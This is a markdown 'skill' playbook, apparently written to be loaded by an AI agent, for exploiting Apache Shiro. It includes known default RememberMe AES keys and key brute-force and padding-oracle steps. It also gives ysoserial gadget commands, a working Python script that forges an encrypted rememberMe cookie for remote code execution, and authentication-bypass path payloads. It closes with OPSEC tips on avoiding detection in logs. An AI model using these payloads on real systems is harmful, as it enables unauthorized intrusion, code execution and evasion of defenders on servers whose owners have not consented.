---
name: shiro-exploitation
description: >-
  Apache Shiro exploitation playbook. Covers RememberMe Cookie deserialization, padding oracle attack for key recovery, default/known key enumeration, AES-CBC decryption, gadget chain selection, and post-exploitation.
---

# SKILL: Apache Shiro Exploitation — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Shiro-specific exploitation covering RememberMe Cookie attacks, padding oracle, key enumeration, and gadget chains. Base models often miss the padding oracle attack variant and default key breadth.

## 0. RELATED ROUTING

- [deserialization-insecure](../deserialization/SKILL.md) for general Java deserialization and gadget chains
- [jndi-injection](../jndi/SKILL.md) for JNDI-based exploitation chains
- [fastjson-exploitation](../fastjson-exploitation/SKILL.md) when Fastjson is also present

---

## 1. VULNERABILITY DETECTION

### 1.1 Fingerprint Shiro

```
# Check for RememberMe cookie in response
Set-Cookie: rememberMe=deleteMe

# If you see "rememberMe=deleteMe" in any response (even without login) → Shiro detected
```

### 1.2 Identify Attack Surface

| Condition | Attack |
|-----------|--------|
| Valid user account available | Direct cookie exploitation |
| No account but login endpoint | Padding oracle on RememberMe |
| Any authenticated endpoint | Padding oracle + key recovery |

---

## 2. DEFAULT KEY ENUMERATION

### 2.1 Common Default Keys

```
kPH+bIxk5D2deZiIxcaaaA==          # Most common (Shiro default)
2AvVhdsgUs0FSA3SDFAdag==          # Shiro 550 default
3AvVhmFLUs0KTA3Kprsdag==          # Common in tutorials
4AvVhmFLUs0KTA3Kprsdag==
6ZmI6I2j5Y+R5aSn5ZOlAA==
```

### 2.2 Key Brute-Force Process

```bash
# Use shiro_attack tool
python shiro_attack.py -u https://target -t "rememberMe cookie value"

# Or use ShiroExploit
java -jar ShiroExploit.jar
```

### 2.3 Padding Oracle Attack

When default keys don't work, use padding oracle to recover the key:

```
1. Login with valid credentials → get valid RememberMe cookie
2. Send modified ciphertext blocks to the server
3. Observe responses for padding validation:
   - "rememberMe=deleteMe" → padding invalid
   - No "deleteMe" → padding valid
4. Recover intermediate state → XOR with previous block → plaintext
5. Recover AES key → forge arbitrary serialized objects
```

Tools: `PaddingOracleAttack`, `shiro-padding-oracle`

---

## 3. EXPLOIT CHAIN

### 3.1 Attack Flow

```
1. Identify Shiro (rememberMe=deleteMe)
2. Enumerate / recover AES key
3. Generate serialized gadget chain payload
4. AES-CBC encrypt with known key
5. Base64 encode → set as rememberMe cookie
6. Send request → server deserializes → RCE
```

### 3.2 Gadget Chain Construction

```bash
# Using ysoserial with CommonsBeanutils1
java -jar ysoserial.jar CommonsBeanutils1 "command" > payload.bin

# Or CommonsCollections variants (check target classpath)
java -jar ysoserial.jar CommonsCollections2 "command" > payload.bin
```

### 3.3 Cookie Generation

```python
import base64, os
from Crypto.Cipher import AES

key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")  # Default key
iv = os.urandom(16)
with open("payload.bin", "rb") as f:
    data = f.read()

cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = iv + cipher.encrypt(pad(data, 16))
cookie = base64.b64encode(encrypted).decode()
print(f"rememberMe={cookie}")
```

---

## 4. COMMON SHIRO CVEs

| CVE | Version | Issue |
|-----|---------|-------|
| CVE-2016-4437 | < 1.2.5 | Default AES key in RememberMe |
| CVE-2019-12422 | < 1.4.2 | Padding oracle attack |
| CVE-2020-1957 | < 1.5.3 | Authentication bypass via regex |
| CVE-2020-11989 | < 1.5.3 | Authentication bypass double encoding |
| CVE-2020-13933 | < 1.6.0 | Authentication bypass via semicolon |
| CVE-2020-17510 | < 1.7.0 | Authentication bypass |
| CVE-2020-17523 | < 1.7.1 | Auth bypass via whitespace |
| CVE-2021-41303 | < 1.8.0 | Authentication bypass via path traversal |

---

## 5. KEYLESS ATTACK — AUTHENTICATION BYPASS

When deserialization isn't viable (no gadget chains, patched JDK):

### 5.1 Path Traversal Bypass

```
# CVE-2020-1957 style
/admin;/page     # Semicolon bypass
/admin/%2e%2e    # Double dot URL encoding
/admin/..;/page  # Path traversal
/;/admin/page    # Prefix semicolon
```

### 5.2 Case Sensitivity

```
/Admin/page      # Some configs match lowercase only
/ADMIN/page
```

---

## 6. OPSEC NOTES

- Padding oracle is slow and noisy — prefer default key first
- RememberMe cookie appears in logs — use clean exploitation
- Gadget chain must match target classpath — enumerate libraries first
- Shiro 1.2.5+ uses random key per deployment — padding oracle may be required
